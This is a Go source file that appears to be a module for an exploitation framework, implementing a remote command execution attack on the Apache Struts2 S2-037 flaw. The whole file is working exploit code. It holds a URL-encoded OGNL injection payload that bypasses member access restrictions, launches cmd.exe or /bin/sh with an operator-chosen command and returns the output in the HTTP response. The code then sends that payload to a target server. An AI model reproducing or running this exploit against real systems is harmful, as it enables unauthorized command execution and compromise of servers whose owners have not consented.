package exp_Struts2

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
)

type Exp_S2_037 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_S2_037) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")

	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	shellPayload := `/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23a%3D%23parameters.reqobj%5B0%5D%2C%23c%3D%23parameters.reqobj%5B1%5D%2C%23req%3D%23context.get(%23a)%2C%23hh%3D%23context.get(%23parameters.rpsobj%5B0%5D)%2C%23osname%3D%40java.lang.System%40getProperty(%23parameters.os_name)%2C%23list%3D%23osname.startsWith(%23parameters.windows)%3Fnew%20java.lang.String%5B%5D%7B%23parameters.cmdexe%2C%23parameters.ccc_c%2C%23parameters.cmd%7D%3Anew%20java.lang.String%5B%5D%7B%23parameters.binbash%2C%23parameters.ccc%2C%23parameters.cmd%7D%2C%23aa%3D(new%20java.lang.ProcessBuilder(%23list)).start()%2C%23bb%3D%23aa.getInputStream()%2C%23hh.getWriter().println(new%20java.lang.String(new%20org.apache.commons.io.IOUtils().toByteArray(%23bb)%2C%23parameters.gbk))%2C%23hh.getWriter().flush()%2C%23hh.getWriter().close())%3AtoString.xhtml?com=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=/&cmd=lz520520&reqobj=struts.txt&content=fb98ab9159f51fd0&os_name=os.name&windows=Windows&binbash=/bin/sh&ccc=-c&cmdexe=cmd.exe&ccc_c=/c&gbk=iso-8859-1`
	cmd = url.PathEscape(cmd)
	shellPayload = strings.Replace(shellPayload, "lz520520", cmd, 1)
	target := strings.TrimRight(self.Params.BaseParam.Target, "?") + shellPayload
	// 发送请求
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}
func init() {
	exp_register.ExpStructRegister(&Exp_S2_037{}, "exp_S2_037.yml")
}
